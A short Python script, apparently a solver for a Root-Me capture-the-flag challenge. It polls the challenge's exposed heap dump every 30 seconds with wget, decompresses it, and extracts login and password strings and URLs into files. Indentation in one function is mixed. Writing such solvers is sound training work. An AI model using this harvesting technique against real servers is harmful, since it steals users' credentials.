import subprocess
import datetime
import time
import re


try:
	all_strings = open('out_log_pass','rb').readlines()
except:
	all_strings = []

try:
	all_href = open('out_href','rb').readlines()
except:
	all_href = []

def dump():
    content = open('tmp/lol', 'rb').read()
    tmp = re.findall('login=.*&password=.{100}', content)
    with open('out_log_pass', 'ab+') as f:
        for i in tmp:
            if i not in all_strings:
                f.write(i+'\n')
    all_strings.extend(tmp)
    tmp = re.findall('/web-serveur/ch46/[\x33-\x79]*[^\x33-\x79]', content)
    with open('out_href', 'ab+') as f:
        for i in tmp:
			if i not in all_href:
				f.write(i+'\n')
	all_href.extend(tmp)

def time_to_str():
	return str(datetime.datetime.now())[:19]

def dump_in_file(path):
	print(path)
	content = open('tmp/lol', 'rb').read()
	tmp = re.findall('login=.*&password=.{150}', content)
	with open(path, 'wb+') as f:
		for i in tmp:
			f.write(i+'\n')
	tmp = re.findall('/web-serveur/ch46/[\x33-\x79]*[^\x33-\x79]', content)
	with open(path+".href", 'wb+') as f:
		for i in tmp:
			f.write(i+'\n')

prefix = "out/"
while True:
	try:
	    s = subprocess.Popen(['wget', '-O', 'tmp/lol.gz', 'challenge01.root-me.org/web-serveur/ch46/heapdump'])
	    s.communicate()
	    print(s.returncode)

	    s = subprocess.Popen(['gzip', '-d', 'tmp/lol.gz'])
	    s.communicate()
	    print(s.returncode)

	    #dump()
	    dump_in_file(prefix+time_to_str())

	    s = subprocess.Popen(['rm', 'tmp/lol'])
	    s.communicate()
	    print(s.returncode)
	except:
		pass

	time.sleep(30)
